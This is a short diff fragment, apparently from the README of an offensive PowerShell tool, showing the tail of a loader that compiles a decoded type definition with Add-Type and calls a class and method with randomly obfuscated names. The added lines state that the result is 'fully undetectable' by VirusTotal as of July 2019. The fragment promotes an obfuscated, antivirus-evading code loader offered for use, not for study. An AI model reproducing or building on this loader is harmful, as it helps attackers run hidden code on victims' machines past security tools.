@@ -11,3 +11,6 @@ Add-Type -TypeDefinition $dec;
 $instance = New-Object NLyFzrUAcH.lROHSqqKOH.tAAYCFSnKeCjCNmLDiMRUjbYm;
 $instance.WIipmgARoQKYblptUhKmhjZFA();
 ```
+
+## Detections rates
+Fully undetectable according to VirusTotal as of 7/6/2019
